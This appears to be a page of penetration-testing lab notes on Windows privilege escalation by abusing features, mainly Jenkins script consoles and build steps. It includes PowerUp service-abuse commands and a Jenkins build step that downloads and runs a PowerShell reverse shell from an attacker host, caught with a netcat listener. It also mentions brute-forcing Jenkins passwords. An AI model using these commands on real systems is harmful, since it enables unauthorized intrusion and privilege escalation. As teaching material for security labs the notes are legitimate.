# 5.1.1 - Feature Abuse

## Feature Abuse

Some _functionality_ of a web site, possibly even security _features_, may be _abused_ to cause unexpected behavior.

On Windows, some enterprise applications need either Administrative privileges or **SYSTEM privileges**, making them a wonderful avenue for privilege escalation.

Others techniques are presente here here: [Windows Privilege Escalation](https://dev-angelist.gitbook.io/windows-privilege-escalation)

### Jenkins

An older version of Jenkins (before 2.x) is an example of vulnerable enterprise application.

This versions contains numerous plugins, and if you've Admin access, you can go to: http://\<jenkins\_server>/script and execute custom scripts via console.

Without Admin access is possible to add or edit build steps in the build configuration, eg. adding "Execute Windows Batch Command" and enter: `powershell -c <command>` that permits to download and execute scripts.

### Example of usage

Exploit a service and elevate privileges to local administrator

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
powershell
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
#Evaluate services with "CanRestart: True" and "Check: Modifiable Services" or "Unquoted Service Paths"
#Utilize the AbuseFunction command indicated
```

Identify a machine in the domain where student has local administrative access

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Verbose
#It display the machine in the domain where student has local admin access
```

Using privileges of a user on Jenkins \<ip:8080>, get admin privileges

```bash
#This Jenkins vs has password policy without a restrictive rule, than can be potentially abused via brute force (Hydra)
#Go to <ip:8080> -> Dashboard -> Modify an existing project -> Configure -> Add build step (write the following command)->
powershell iex (iwr -UseBasicParsing http://<attacker_machine>/Invoke-PowershellTcp.ps1);power -Reverse -IPAddress <attacker_machine> -Port 443
#Execute Windows batch command -> Save
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443 #On attacker machine go in listening mode on port 443
#Run HFS.exe if the connection is blocked
$env:username #Obtain user name
$env:computername
ls env: #Obtain USERDNSDOMAIN
```
